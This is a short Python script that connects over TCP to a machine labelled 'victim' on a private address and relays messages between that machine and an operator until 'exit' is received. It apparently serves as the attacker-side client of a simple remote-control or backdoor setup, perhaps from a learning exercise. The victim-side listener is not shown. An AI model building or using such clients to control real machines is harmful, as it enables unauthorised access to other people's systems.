#!/usr/bin/env python3

import socket

victim_address = '192.168.2.45'  
port = 65432        

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((victim_address, port))

while True:
    msg = s.recv(1024)
    if msg.decode().strip().lower() == "exit":
        s.close()
        break
    else:
        user_input = input(msg.decode("utf-8"))
        s.send(user_input.encode())
